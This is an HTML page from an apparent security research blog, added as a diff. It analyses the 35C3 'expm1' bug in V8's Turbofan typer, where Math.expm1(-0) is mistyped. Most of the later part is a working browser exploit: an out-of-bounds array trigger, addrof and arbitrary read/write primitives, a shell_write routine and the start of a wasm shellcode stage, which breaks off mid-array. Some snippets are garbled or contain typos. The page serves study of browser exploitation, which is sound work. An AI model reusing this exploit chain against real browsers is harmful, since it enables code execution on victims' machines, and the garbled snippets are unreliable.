@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>expm1-35C3 - Bug/ Optimizations Analysis | Security Research Blog</title>
+    <meta name="description" content="">
+    <link href="/src/index.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark-dimmed.min.css" integrity="sha512-1oUqkJ4yM1l7zN2Zzv+YgX3F5mO2xX2f8t8sM2dM2tJm7QJ0tYq1eV4V9JF8x7l6m7wE3aXq0n0+vWe4m3kUHQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        html, body { background:#000; color:#e0e0e0; }
+        body { 
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            color: #e0e0e0;
+        }
+        .prose pre code { font-family: 'Courier New', monospace; }
+        .gradient-text {
+            background: linear-gradient(135deg, #4facfe, #00f2fe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .toc { border: 1px solid #333; border-radius: 8px; padding: 1rem; background:#0f0f0f; }
+        .toc ul { list-style: disc; padding-left: 1rem; }
+        /* Typography enhancements */
+        article.prose { line-height: 1.8; }
+        article.prose h1, article.prose h2, article.prose h3, article.prose h4 {
+          margin-top: 2rem; margin-bottom: 1rem; font-weight: 700;
+        }
+        article.prose h1 { font-size: 2rem; color: #fca5a5; }
+        article.prose h2 { font-size: 1.5rem; color: #93c5fd; }
+        article.prose h3 { font-size: 1.25rem; color: #fcd34d; }
+        article.prose p { margin: 1rem 0; color: #d4d4d8; }
+        article.prose a { color: #60a5fa; text-decoration: underline; }
+        article.prose hr { border-color: #2e2e2e; margin: 2rem 0; }
+        article.prose blockquote {
+          border-left: 4px solid #374151; padding: 0.75rem 1rem; background: #0f0f0f; color: #cbd5e1;
+          margin: 1.25rem 0; border-radius: 6px;
+        }
+        article.prose ul, article.prose ol { padding-left: 1.5rem; margin: 1rem 0; }
+        article.prose li { margin: 0.25rem 0; }
+        article.prose pre {
+          background: #0b0b0b; border: 1px solid #2a2a2a; border-radius: 8px; padding: 1rem; overflow-x: auto;
+        }
+        article.prose code { background: #111318; border: 1px solid #2a2a2a; padding: 0.15rem 0.35rem; border-radius: 4px; }
+        article.prose pre code { background: transparent; border: 0; padding: 0; }
+        article.prose table { width: 100%; border-collapse: collapse; margin: 1.25rem 0; }
+        article.prose th, article.prose td { border: 1px solid #2a2a2a; padding: 0.5rem 0.75rem; }
+        article.prose th { background: #0f0f0f; color: #e5e7eb; }
+        article.prose img { display: block; max-width: 100%; height: auto; margin: 1.25rem auto; border-radius: 8px; }
+
+    </style>
+</head>
+<body class="min-h-screen">
+    <div class="container mx-auto max-w-4xl px-6 py-12">
+        <!-- Header -->
+        <header class="mb-12">
+            <a href="javascript:history.back()" class="text-emerald-400 hover:text-emerald-300 mb-4 inline-block">← Back</a>
+            <h1 class="text-4xl md:text-5xl font-bold mb-4">
+                <span class="gradient-text">expm1-35C3 - Bug/ Optimizations Analysis</span>
+            </h1>
+            <div class="flex items-center gap-4 text-sm text-gray-400 mb-6">
+                <span>Mon Feb 19 2024 05:30:00 GMT+0530 (India Standard Time)</span>
+                <span>•</span>
+                <span>9 min read</span>
+                <span>•</span>
+                <div class="flex gap-2">
+                    <span class="bg-emerald-500/20 text-emerald-300 px-2 py-1 rounded text-xs">math.expm1</span>
+                
+                    <span class="bg-emerald-500/20 text-emerald-300 px-2 py-1 rounded text-xs">typer</span>
+                
+                    <span class="bg-emerald-500/20 text-emerald-300 px-2 py-1 rounded text-xs">OOB</span>
+                </div>
+            </div>
+        </header>
+
+        <!-- Content -->
+        <article class="prose prose-invert max-w-none">
+<p>In this post, we’ll dive deep into a fascinating bug in the V8 JavaScript engine that arises from the mishandling of the Math.expm1(-0) function during the optimization process.</p>
+<!--more-->
+<p>We’ll break down how this edge case is misoptimized by V8’s Turbofan compiler, explore the root cause of the issue, and demonstrate how this leads to unexpected behavior.</p>
+<p>For context, we’ll focus on the technical aspects surrounding the typer phase and its consequences for browser exploitation. PS: This is more or less my notes, So if there is any errors/false observations please bear with it and ping me on discord (tourpran).</p>
+<h2 id="background-on-math.expm1" tabindex="-1"><a class="header-anchor" href="#background-on-math.expm1">Background on Math.expm1</a></h2>
+<p>The <code>Math.expm1(x)</code> function calculates <code>e^x - 1</code> with improved precision for small values of <code>x</code>. For example:</p>
+<ul>
+<li><code>Math.expm1(0)</code> returns <code>0</code></li>
+<li><code>Math.expm1(-0)</code> returns <code>-0</code>, due to the handling of signed zeros in JavaScript.</li>
+</ul>
+<p>This distinction is significant in JavaScript, where <code>0</code> and <code>-0</code> behave differently in equality comparisons and mathematical operations. According to the ECMAScript specification, <code>Math.expm1(-0)</code> should return <code>-0</code>, but a bug in V8’s optimization pipeline causes it to be incorrectly handled.</p>
+<h2 id="expected-behavior-of-math.expm1(-0)" tabindex="-1"><a class="header-anchor" href="#expected-behavior-of-math.expm1(-0)">Expected Behavior of Math.expm1(-0)</a></h2>
+<p>The ECMAScript spec mandates that <code>Math.expm1(-0)</code> must return <code>-0</code>. This behavior is critical when dealing with negative zero in JavaScript. Here’s why:</p>
+<ul>
+<li><code>0</code> and <code>-0</code> are distinct values in JavaScript, despite being equal according to <code>==</code> and <code>===</code>.</li>
+<li>However, <code>Object.is(0, -0)</code> correctly returns <code>false</code>, recognizing the difference between the two.
+When <code>Math.expm1(-0)</code> is mishandled during optimization, it leads to incorrect behavior in cases where signed zeros are important.</li>
+</ul>
+<h2 id="understanding-the-bug%3A" tabindex="-1"><a class="header-anchor" href="#understanding-the-bug%3A">Understanding the bug:</a></h2>
+<p>The typer processes the code by executing several phases:</p>
+<ul>
+<li><strong>Typer Phase</strong>: Determines the types of various nodes in the graph.</li>
+<li><strong>TypeNarrowingReducer</strong>: Eliminates unnecessary loads based on narrowed types.</li>
+<li><strong>Simplified Lowering Phase</strong>: Applies further optimizations by lowering nodes into simpler operations.
+In the case of <code>Math.expm1(-0)</code>, the result should always be <code>-0</code>. However, the <code>typer</code> mistakenly classifies the range as <code>(plainNumber, NaN)</code>, when in fact, <code>-0</code> is neither a <code>plain number</code> nor a <code>NaN</code>, leading to an incorrect assumption during <code>type analysis</code>.
+<img src="/images/math_expm_bug/image-3.png" alt="idek4"></li>
+</ul>
+<h2 id="object.is()" tabindex="-1"><a class="header-anchor" href="#object.is()"><a href="http://Object.is">Object.is</a>()</a></h2>
+<h3 id="1--initial-phase%3A" tabindex="-1"><a class="header-anchor" href="#1--initial-phase%3A">1- Initial Phase:</a></h3>
+<ul>
+<li>The <code>typer</code> assigns the <code>Object.is()</code> node as a <code>SameValue</code> node. This can be seen in <a href="https://v8.github.io/tools/head/turbolizer/index.html">turbolizer</a>.</li>
+</ul>
+<p><img src="/images/math_expm_bug/image.png" alt="initial"></p>
+<h3 id="2--typed-optimization%3A" tabindex="-1"><a class="header-anchor" href="#2--typed-optimization%3A">2- Typed Optimization:</a></h3>
+<ul>
+<li>In this phase, <code>SameValue</code> is further reduced to <code>ObjectIsMinusZero()</code> when either side of the comparison involves <code>-0</code>. This makes comparisons more efficient by focusing on the specific case of <code>-0</code>.</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lhs_type.<span class="hljs-built_in">Is</span>(Type::<span class="hljs-built_in">MinusZero</span>())) {
+    <span class="hljs-comment">// SameValue(x:minus-zero,y) =&gt; ObjectIsMinusZero(y)</span>
+    node-&gt;<span class="hljs-built_in">RemoveInput</span>(<span class="hljs-number">0</span>);
+    NodeProperties::<span class="hljs-built_in">ChangeOp</span>(node, <span class="hljs-built_in">simplified</span>()-&gt;<span class="hljs-built_in">ObjectIsMinusZero</span>());
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Changed</span>(node);
+  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rhs_type.<span class="hljs-built_in">Is</span>(Type::<span class="hljs-built_in">MinusZero</span>())) {
+    <span class="hljs-comment">// SameValue(x,y:minus-zero) =&gt; ObjectIsMinusZero(x)</span>
+    node-&gt;<span class="hljs-built_in">RemoveInput</span>(<span class="hljs-number">1</span>);
+    NodeProperties::<span class="hljs-built_in">ChangeOp</span>(node, <span class="hljs-built_in">simplified</span>()-&gt;<span class="hljs-built_in">ObjectIsMinusZero</span>());
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Changed</span>(node);
+  }
+</code></pre>
+<p><img src="/images/math_expm_bug/image-1.png" alt="idek1"></p>
+<h3 id="3--simplified-lowering%3A" tabindex="-1"><a class="header-anchor" href="#3--simplified-lowering%3A">3- Simplified Lowering:</a></h3>
+<ul>
+<li>This phase further optimizes the <code>ObjectIsMinusZero()</code> node. If the input is confirmed to be <code>-0</code>, the node is simplified and deferred for replacement, enhancing overall efficiency.</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-keyword">case</span> IrOpcode::kObjectIsMinusZero: 
+Type <span class="hljs-type">const</span> input_type = <span class="hljs-built_in">GetUpperBound</span>(node-&gt;<span class="hljs-built_in">InputAt</span>(<span class="hljs-number">0</span>));
+<span class="hljs-keyword">if</span> (input_type.<span class="hljs-built_in">Is</span>(Type::<span class="hljs-built_in">MinusZero</span>())) {
+    <span class="hljs-built_in">VisitUnop</span>(node, UseInfo::<span class="hljs-built_in">None</span>(), MachineRepresentation::kBit);
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">lower</span>()) {
+    <span class="hljs-built_in">DeferReplacement</span>(node, lowering-&gt;<span class="hljs-built_in">jsgraph</span>()-&gt;<span class="hljs-built_in">Int32Constant</span>(<span class="hljs-number">1</span>));
+    }
+}
+</code></pre>
+<h2 id="patch-and-bug-details%3A" tabindex="-1"><a class="header-anchor" href="#patch-and-bug-details%3A">Patch and Bug Details:</a></h2>
+<ul>
+<li>The <code>Math.expm1()</code> operation is incorrectly converted to a combination of <code>Float64Expm1</code> and <code>ChangeFloat64ToTagged</code>, which causes <code>-0</code> to be truncated to <code>0</code>.</li>
+<li>By using a <code>Call</code> node and invoking the inbuilt V8 <code>Math.expm1</code>, this truncation issue can be avoided.</li>
+<li>The patch has only been applied to <code>typer.cc</code> but not to <code>operation-typer</code>, allowing the creation of a <code>Call</code> node using V8 builtins to correctly handle <code>Math.expm1</code>, even though it still makes incorrect type assumptions.</li>
+</ul>
+<p><img src="/images/math_expm_bug/image-4.png" alt="ide"></p>
+<p>This patch addresses the issue in <code>typer.cc</code>, but a more comprehensive solution requires changes in other parts of the type system to fully fix the handling of <code>-0</code> in <code>Math.expm1</code>.</p>
+<h2 id="pipeline-of-turbofan%3A" tabindex="-1"><a class="header-anchor" href="#pipeline-of-turbofan%3A">Pipeline of TurboFan:</a></h2>
+<p><img src="/images/math_expm_bug/image-5.png" alt="Pipeline of TurboFan"></p>
+<p>TurboFan’s pipeline consists of multiple phases that optimize and lower JavaScript code into highly optimized machine code. The key stages include type inference, node optimization (such as <code>SameValue</code> being converted to checks like <code>ObjectIsMinusZero</code>), and various lowering phases that simplify and optimize the code.</p>
+<h2 id="typer-phase%3A" tabindex="-1"><a class="header-anchor" href="#typer-phase%3A">Typer Phase:</a></h2>
+<ul>
+<li>The typer traverses all the nodes in the intermediate representation (IR) and processes them through the GraphReducer.</li>
+<li>For each node, it attempts to assign the most accurate type information, optimizing how the node will be executed in subsequent phases.</li>
+</ul>
+<h2 id="type-lowering%3A" tabindex="-1"><a class="header-anchor" href="#type-lowering%3A">Type Lowering:</a></h2>
+<ul>
+<li>This phase focuses on extensive optimizations, including refining operations and simplifying nodes for better performance in the backend stages of Turbofan.
+<img src="/images/math_expm_bug/image-7.png" alt="Type Lowering Phase"></li>
+</ul>
+<h2 id="escape-analysis%3A" tabindex="-1"><a class="header-anchor" href="#escape-analysis%3A">Escape analysis:</a></h2>
+<pre class="hljs"><code><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) {
+  <span class="hljs-keyword">let</span> o = {<span class="hljs-attr">a</span>: <span class="hljs-number">5</span>};
+  <span class="hljs-keyword">return</span> o.<span class="hljs-property">a</span>;
+}
+</code></pre>
+<blockquote>
+<p>Clearly, it can be rewritten as:</p>
+</blockquote>
+<pre class="hljs"><code><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) {
+  <span class="hljs-keyword">let</span> <span class="hljs-number">0.</span> a = <span class="hljs-number">5</span>;
+  <span class="hljs-keyword">return</span> o_a;
+}
+</code></pre>
+<p><a href="https://www.youtube.com/watch?v=KiWEWLwQ3oI&amp;ab_channel=NightHacking">Great Video on Escape Analysis</a></p>
+<h2 id="additional-optimizations" tabindex="-1"><a class="header-anchor" href="#additional-optimizations">Additional Optimizations</a></h2>
+<ul>
+<li>If you’re interested, you can find more information about V8 TurboFan’s optimizations in the documentation <a href="https://v8.dev/docs/turbofan">here</a>.</li>
+</ul>
+<h2 id="exploitation%3A" tabindex="-1"><a class="header-anchor" href="#exploitation%3A">Exploitation:</a></h2>
+<ul>
+<li>
+<p><strong>Problem:</strong> The <code>sameValue</code> variable is of boolean type, which leads to the type assumption of (0, 1337), resulting in no out-of-bounds (OOB) access.<br>
+<img src="/images/math_expm_bug/image-8.png" alt="bob"><br>
+<img src="/images/math_expm_bug/image-9.png" alt="bob"></p>
+</li>
+<li>
+<p>As mentioned in the blog, we need to retain the <code>sameValue</code> node until the final optimization, folding it to <code>true</code>. This means the compiler shouldn’t be aware that we’re comparing with <code>-0</code> until the very last optimization step.</p>
+</li>
+<li>
+<p>In escape analysis, we can replace -0 with <code>Object.is()</code>, and during simplified lowering, we achieve the desired range value, allowing us to remove the bounds check. The <code>assumed</code> return type becomes false, ensuring that it will always remain within the array limits.</p>
+</li>
+</ul>
+<blockquote>
+<p>#79: CheckBounds[VectorSlotPair(INVALID)] (#125:NumberMultiply, #58:NumberConstant, #45:Checkpoint, #43:Call)  [Static type: Range(0, 4), Feedback type: Range(0, 0)]</p>
+</blockquote>
+<p><img src="/images/math_expm_bug/image-10.png" alt="idekde"></p>
+<h2 id="oob-array-creation%3A" tabindex="-1"><a class="header-anchor" href="#oob-array-creation%3A">OOB Array Creation:</a></h2>
+<ul>
+<li>By exploiting out-of-bounds (OOB) array access, we can leak the addresses of objects by keeping them close to a float array. After much trial and error, along with extensive monkey patching, I finally discovered a more effective method for achieving a memory leak.</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-keyword">function</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">x, i = <span class="hljs-number">1</span></span>) {
+    <span class="hljs-keyword">let</span> a = [<span class="hljs-number">1.1</span>, <span class="hljs-number">2.2</span>, <span class="hljs-number">3.3</span>];
+    <span class="hljs-keyword">let</span> b = [<span class="hljs-number">5.5</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">5.5</span>];
+    <span class="hljs-keyword">let</span> o = { <span class="hljs-attr">m</span>: -<span class="hljs-number">0</span> };
+    <span class="hljs-keyword">let</span> t = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">expm1</span>(x), o.<span class="hljs-property">m</span>) + <span class="hljs-number">0</span>;
+    t *= (i + <span class="hljs-number">0</span>); <span class="hljs-comment">// Convert i to an integral type.</span>
+    <span class="hljs-keyword">let</span> val = a[t];
+    oob_rw_buffer = b;
+    <span class="hljs-keyword">return</span> val;
+}
+</code></pre>
+<ul>
+<li>
+<p>Here, <code>a</code> is the array from which we want to access out-of-bounds values, while <code>b</code> is the array where we intend to manipulate the length field.</p>
+</li>
+<li>
+<p><strong>Tricky Part:</strong> The parameter <code>i</code> has an ambiguous type, so I added <code>0</code> to it to ensure it is treated as an integral type. This adjustment, along with the feedback, enables the OOB read. Silly JavaScript engine!</p>
+</li>
+<li>
+<p>Finally, I’m storing the context of <code>b</code> in the <code>oob_rw_buffer</code>. Below is a rough illustration of the leak following the adjustment to the fixed array <code>a</code>.</p>
+</li>
+</ul>
+<p><strong>Leaks of the current state:</strong></p>
+<pre class="hljs"><code>3) int: 0x7a7e2501459
+4) int: 0x500000000
+5) int: 0x4016000000000000
+6) int: 0x4016000000000000
+7) int: 0x4016000000000000
+8) int: 0x4016000000000000
+9) int: 0x4016000000000000
+10) int: 0x375928582cf9    - (map of b)
+11) int: 0x7a7e2500c21     - (property of b)
+12) int: 0x65ad13cc1c9     - (element backing pointer of b)
+13) int: 0x500000000       - (length field)
+14) int: 0x7a7e2500561
+15) int: 0x8000000000000000
+16) int: 0x3ff199999999999a
+17) int: 0x3ff199999999999a
+18) int: 0x3ff199999999999a
+19) int: 0x3ff199999999999a
+</code></pre>
+<h3 id="addrof-primitive%3A" tabindex="-1"><a class="header-anchor" href="#addrof-primitive%3A">Addrof Primitive:</a></h3>
+<ul>
+<li>With the OOB array in place, having another array afterwards allows us to perform an OOB array read, thus enabling the creation of an <code>addrof</code> primitive.</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-keyword">let</span> oob_rw_buffer = <span class="hljs-literal">undefined</span>;
+<span class="hljs-keyword">let</span> aux_arr = <span class="hljs-literal">undefined</span>;
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">obj</span>){
+  aux_arr[<span class="hljs-number">0</span>] = obj;
+  <span class="hljs-keyword">return</span> oob_rw_buffer[<span class="hljs-number">0x12</span>];
+}
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">stagel</span>(<span class="hljs-params">x, i=<span class="hljs-number">1</span></span>){
+  <span class="hljs-keyword">let</span> a = [<span class="hljs-number">1.1</span>, <span class="hljs-number">2.2</span>, <span class="hljs-number">3.3</span>];
+  <span class="hljs-keyword">let</span> b = [<span class="hljs-number">5.5</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">5.5</span>];
+  <span class="hljs-keyword">let</span> c = [{}, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>];
+  <span class="hljs-keyword">let</span> o = {<span class="hljs-attr">m</span>: -<span class="hljs-number">0</span>};
+  <span class="hljs-keyword">let</span> t = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">expml</span>(x), o.<span class="hljs-property">m</span>) + <span class="hljs-number">0</span>;  <span class="hljs-comment">// trigger the bug.</span>
+  t *= (i+<span class="hljs-number">0</span>);                                 <span class="hljs-comment">// i to inegral.</span>
+  a[t] = <span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>;
+  oob_rw_buffer = b;                          <span class="hljs-comment">// expose b to global scope</span>
+  aux arr = c;
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<h3 id="arb-read-%2F-arb-write%3A" tabindex="-1"><a class="header-anchor" href="#arb-read-%2F-arb-write%3A">Arb Read / Arb Write:</a></h3>
+<ul>
+<li>By storing the <code>ArrayBuffer</code> after all the allocations, we can calculate the offset difference between the <code>ArrayBuffer</code> and the OOB array. This enables us to perform arbitrary read and write operations.</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-keyword">function</span> <span class="hljs-title function_">arb_write</span>(<span class="hljs-params">addr, val</span>) {
+    oob_rw_buffer[diff / <span class="hljs-number">8n</span>] = addr.<span class="hljs-title function_">i2f</span>();
+    dv.<span class="hljs-title function_">setBigUint64</span>(<span class="hljs-number">0</span>, val, <span class="hljs-literal">true</span>);
+}
+</code></pre>
+<pre class="hljs"><code><span class="hljs-keyword">function</span> <span class="hljs-title function_">arb_read</span>(<span class="hljs-params">addr</span>) {
+    oob_rw_buffer[diff / <span class="hljs-number">8n</span>] = addr.<span class="hljs-title function_">i2f</span>();
+    <span class="hljs-keyword">return</span> dv.<span class="hljs-title function_">getBigUint64</span>(<span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);
+}
+</code></pre>
+<h2 id="final-exploit%3A" tabindex="-1"><a class="header-anchor" href="#final-exploit%3A">Final Exploit:</a></h2>
+<blockquote>
+<p>This is the final exploit I’ve developed, ready to target the V8 engine. However, to ensure reliability for Chrome, I need to correct the objects I corrupted and proceed with caution. If we manage to escape the Chrome sandbox, it’s game over.</p>
+</blockquote>
+<pre class="hljs"><code><span class="hljs-comment">// ------------------------------------------------ Utility- Functions ------------------------------------------------ //</span>
+<span class="hljs-keyword">let</span> conversion_buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">8</span>);
+<span class="hljs-keyword">let</span> float_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(conversion_buffer);
+<span class="hljs-keyword">let</span> int_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(conversion_buffer);
+<span class="hljs-title class_">BigInt</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">hex</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
+  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>);
+};
+<span class="hljs-title class_">BigInt</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">i2f</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
+  int_view[<span class="hljs-number">0</span>] = <span class="hljs-variable language_">this</span>;
+  <span class="hljs-keyword">return</span> float_view[<span class="hljs-number">0</span>];
+}
+<span class="hljs-title class_">BigInt</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">smi2f</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
+  int_view[<span class="hljs-number">0</span>] = <span class="hljs-variable language_">this</span> &lt;&lt; <span class="hljs-number">32n</span>;
+  <span class="hljs-keyword">return</span> float_view[<span class="hljs-number">0</span>];
+}
+<span class="hljs-title class_">Number</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">f2i</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
+  float_view[<span class="hljs-number">0</span>] = <span class="hljs-variable language_">this</span>;
+  <span class="hljs-keyword">return</span> int_view[<span class="hljs-number">0</span>];
+}
+<span class="hljs-title class_">Number</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">f2smi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
+  float_view[<span class="hljs-number">0</span>] = <span class="hljs-variable language_">this</span>;
+  <span class="hljs-keyword">return</span> int_view[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">32n</span>;
+}
+<span class="hljs-title class_">Number</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">i2f</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
+  <span class="hljs-keyword">return</span> <span class="hljs-title class_">BigInt</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-title function_">i2f</span>();
+}
+<span class="hljs-title class_">Number</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">smi2f</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
+  <span class="hljs-keyword">return</span> <span class="hljs-title class_">BigInt</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-title function_">smi2f</span>();
+}
+
+<span class="hljs-comment">// ----------------------------------------------- Starting the exploit ----------------------------------------------- //</span>
+
+<span class="hljs-keyword">let</span> oob_rw_buffer = <span class="hljs-literal">undefined</span>;
+<span class="hljs-keyword">let</span> aux_arr = <span class="hljs-literal">undefined</span>;
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">obj</span>){
+    aux_arr[<span class="hljs-number">0</span>] = obj;
+    <span class="hljs-keyword">return</span> oob_rw_buffer[<span class="hljs-number">0x12</span>];
+}
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">stage1</span>(<span class="hljs-params">x, i=<span class="hljs-number">1</span></span>){
+    <span class="hljs-keyword">let</span> a = [<span class="hljs-number">1.1</span>, <span class="hljs-number">2.2</span>, <span class="hljs-number">3.3</span>];
+    <span class="hljs-keyword">let</span> b = [<span class="hljs-number">5.5</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">5.5</span>];
+    <span class="hljs-keyword">let</span> c = [{}, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>];
+    <span class="hljs-keyword">let</span> o = {<span class="hljs-attr">m</span>: -<span class="hljs-number">0</span>};
+    <span class="hljs-keyword">let</span> t = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">expm1</span>(x), o.<span class="hljs-property">m</span>) + <span class="hljs-number">0</span>; <span class="hljs-comment">// trigger the bug.</span>
+    t *= (i+<span class="hljs-number">0</span>); <span class="hljs-comment">// i to inegral.</span>
+    a[t] = <span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>;
+    oob_rw_buffer = b; <span class="hljs-comment">// expose b to global scope</span>
+    aux_arr = c;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+  }
+
+<span class="hljs-title function_">stage1</span>(<span class="hljs-number">0</span>);
+<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100000</span>;i++){
+    <span class="hljs-title function_">stage1</span>(<span class="hljs-string">&quot;0&quot;</span>);
+}
+<span class="hljs-title function_">stage1</span>(-<span class="hljs-number">0</span>, <span class="hljs-number">13</span>); <span class="hljs-comment">// get the OOB array.</span>
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Stage 1: Obtained a OOB array&quot;</span>);
+
+<span class="hljs-comment">// Stage 2</span>
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">arb_write</span>(<span class="hljs-params">addr, val</span>){
+  oob_rw_buffer[diff/<span class="hljs-number">8n</span>] = addr.<span class="hljs-title function_">i2f</span>();
+  dv.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">0</span>, val, <span class="hljs-literal">true</span>);
+}
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">arb_read</span>(<span class="hljs-params">addr</span>){
+  oob_rw_buffer[diff/<span class="hljs-number">8n</span>] = addr.<span class="hljs-title function_">i2f</span>();
+  <span class="hljs-keyword">return</span> dv.<span class="hljs-title function_">getBigUint64</span>(<span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);
+}
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">shell_write</span>(<span class="hljs-params">addr, shellcode</span>){
+  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;shellcode.<span class="hljs-property">length</span>;i++){
+    <span class="hljs-title function_">arb_write</span>(addr+<span class="hljs-title class_">BigInt</span>(<span class="hljs-number">4</span>*i), shellcode[i]);
+  }
+}
+<span class="hljs-keyword">let</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x100</span>);
+<span class="hljs-keyword">let</span> dv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(buf);
+
+buf_addr = <span class="hljs-title function_">addrof</span>(buf).<span class="hljs-title function_">f2i</span>();
+oob_addr = <span class="hljs-title function_">addrof</span>(oob_rw_buffer).<span class="hljs-title function_">f2i</span>();
+<span class="hljs-keyword">let</span> diff = buf_addr-oob_addr+<span class="hljs-number">72n</span>; <span class="hljs-comment">//from the OOB array to array buffer </span>
+
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] ArrayBuffer addr: &quot;</span> + buf_addr.<span class="hljs-title function_">hex</span>());
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Offset btw oob and arraybuffer: &quot;</span> + diff);
+
+
+<span class="hljs-comment">// wasm for RWS shellcode</span>
+<span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span 